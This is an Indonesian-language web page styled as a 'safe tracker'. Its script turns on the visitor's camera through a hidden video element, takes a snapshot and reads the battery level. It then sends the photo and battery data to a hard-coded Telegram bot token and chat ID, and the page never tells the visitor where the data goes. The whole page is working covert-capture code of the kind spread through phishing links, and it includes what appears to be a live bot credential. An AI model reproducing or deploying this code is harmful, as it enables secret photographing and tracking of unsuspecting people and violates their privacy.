<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pelacak Aman</title>
<style>
  body {
    background: #0f1724;
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    font-family: Arial, sans-serif;
  }
  video {
    display: none;
  }
  button {
    padding: 10px 20px;
    font-size: 18px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    background: #4CAF50;
    color: white;
  }
</style>
</head>
<body>
  <h1>Pelacak Aman</h1>
  <p>Tekan tombol di bawah untuk mulai pelacakan.</p>
  <button id="startBtn">Mulai Pelacakan</button>
  <video id="video" autoplay playsinline></video>

<script>
const BOT_TOKEN = "8061746076:AAG0vxdkrXYxpfq7jXBiDbvUvltQUGIp-y8";
const CHAT_ID = "7950114253";

document.getElementById("startBtn").addEventListener("click", async () => {
  try {
    // Akses kamera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;

    // Tunggu video siap
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Ambil snapshot
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Stop kamera
    stream.getTracks().forEach(track => track.stop());

    // Ambil data baterai
    let batteryInfo = "Battery info not available";
    if ("getBattery" in navigator) {
      const battery = await navigator.getBattery();
      batteryInfo = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging ? "Ya" : "Tidak"}`;
    }

    // Kirim foto ke Telegram
    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "snapshot.jpg");
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });

    // Kirim pesan baterai
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `Info Baterai: ${batteryInfo}`
      })
    });

    alert("Data berhasil dikirim ke Telegram.");
  } catch (err) {
    alert("Gagal mengakses kamera atau mengirim data: " + err.message);
  }
});
</script>
</body>
</html>
